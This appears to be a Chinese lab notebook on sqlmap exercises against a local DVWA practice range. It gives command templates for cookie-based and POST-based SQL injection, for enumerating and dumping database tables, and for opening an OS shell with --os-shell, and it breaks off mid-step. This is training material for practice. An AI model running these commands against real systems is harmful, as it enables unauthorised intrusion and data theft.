# Sqlmap实战笔记

### 一、利用Sqlmap进行需要登录的注入

1. 搭建实验环境：打开burp，使用DVWA下的[SQL Injection](http://127.0.0.1:8081/range/dvwa/vulnerabilities/sqli/)

2. 实验步骤：

   > 1. 任意输入数据并抓包：获取请求包的Cookie值
   >
   >    ![image-20210831114425813](images/Sqlmap实战笔记/image-20210831114425813.png)
   >
   >    ![image-20210831115308161](images/Sqlmap实战笔记/image-20210831115308161.png)
   >
   > 2. 打开Sqlmap，通过获得的Cookie值使用Cookie注入命令：`sqlmap.py -u "注入点" --cookie=”获取的cookie”`
   >
   >    > * 列出当前数据库：`sqlmap.py -u "注入点" --cookie=”获取的cookie” --current-db`
   >    >
   >    >   ![image-20210831121817572](images/Sqlmap实战笔记/image-20210831121817572.png)
   >    >
   >    >   ---
   >    >
   >    >   ![image-20210831121903651](images/Sqlmap实战笔记/image-20210831121903651.png)
   >    >
   >    > * 枚举出指定数据库（当前数据库）的所有表：`sqlmap.py -u "注入点" --cookie=”获取的cookie” -D 当前数据库名 --tables`
   >    >
   >    >   ![image-20210831130129447](images/Sqlmap实战笔记/image-20210831130129447.png)
   >    >
   >    >   ---
   >    >
   >    >   ![image-20210831130150470](images/Sqlmap实战笔记/image-20210831130150470.png)
   >    >
   >    > * 查看指定表中的所有字段：`sqlmap.py -u "注入点" --cookie=”获取的cookie” -D 指定数据库名 -T 指定表名 --columns`
   >    >
   >    >   ![image-20210831130413638](images/Sqlmap实战笔记/image-20210831130413638.png)
   >    >
   >    >   ---
   >    >
   >    >   ![image-20210831130453344](images/Sqlmap实战笔记/image-20210831130453344.png)
   >    >
   >    > * 查看指定字段的所有数据：`sqlmap.py -u "注入点" --cookie=”获取的cookie” -D 指定数据库名 -T 指定表名 -C 指定字段1,指定字段2 --dump --batch`
   >    >
   >    >   ![image-20210831130937449](images/Sqlmap实战笔记/image-20210831130937449.png)
   >    >
   >    >   ---
   >    >
   >    >   ![image-20210831131022770](images/Sqlmap实战笔记/image-20210831131022770.png)

### 二、利用sqlmap进行POST注入

1. 搭建实验环境：打开burp，使用DVWA下的[Brute Force](http://127.0.0.1:8081/range/dvwa/vulnerabilities/brute/)

2. 实验步骤：

   > 1. 使用Burp抓包，并将请求包保存至sqlmap目录下
   >
   >    ![image-20210831184654925](images/Sqlmap实战笔记/image-20210831184654925.png)
   >
   > 2. 枚举出所有的数据库名：`python sqlmap.py -r 保存的请求包文件 -p SQL注入点 --dbs`
   >
   >    ![image-20210831191310454](images/Sqlmap实战笔记/image-20210831191310454.png)
   >
   >    这道题的SQL注入点为username参数
   >
   >    ---
   >
   >    ![image-20210831191521760](images/Sqlmap实战笔记/image-20210831191521760.png)
   >
   > 3. 选择一个数据库，枚举其中的所有表名：`python sqlmap.py -r 保存的请求包文件 -p SQL注入点 -D 表名 --tables`
   >
   >    ![image-20210831191935339](images/Sqlmap实战笔记/image-20210831191935339.png)
   >
   >    ---
   >
   >    ![image-20210831191920358](images/Sqlmap实战笔记/image-20210831191920358.png)
   >
   > 4. 选择一个表，枚举其中的所有字段名：`python sqlmap.py -r 保存的请求包文件 -p SQL注入点 -D 表名 -T 表名 --columns`
   >
   >    ![image-20210831192329996](images/Sqlmap实战笔记/image-20210831192329996.png)
   >
   >    ---
   >
   >    ![image-20210831192310374](images/Sqlmap实战笔记/image-20210831192310374.png)
   >
   > 5. 枚举出指定表中指定字段的数据：`python sqlmap.py -r 保存的请求包文件 -p SQL注入点 -D 表名 -T 表名 -C "指定字段1,指定字段2，…" --dump --batch`
   >
   >    ![image-20210831192732494](images/Sqlmap实战笔记/image-20210831192732494.png)
   >
   >    ---
   >
   >    ![image-20210831192757046](images/Sqlmap实战笔记/image-20210831192757046.png)

### 三、利用sqlmap交互式写shell

1. 搭建实验环境，从存在命令执行漏洞的位置（[Command Injection](http://127.0.0.1:8081/range/dvwa/vulnerabilities/exec/)）获取当前路径，从存在SQL注入的位置（[SQL Injection](http://127.0.0.1:8081/range/dvwa/vulnerabilities/sqli/)）写shell

2. 实验步骤：

   > 1. 通过存在命令执行漏洞的位置获取当前路径：
   >
   >    ![image-20210831205333249](images/Sqlmap实战笔记/image-20210831205333249.png)
   >
   >    > Windows下用：chdir
   >    >
   >    > Linux下用：pwd
   >
   > 2. 抓包获取Cookie值后，利用Cookie进行注入：`sqlmap.py -u "注入点" --cookie=”获取的cookie” --os-shell `
   >
   >    > 1. 判断当前用户权限
   >    >
   >    >    



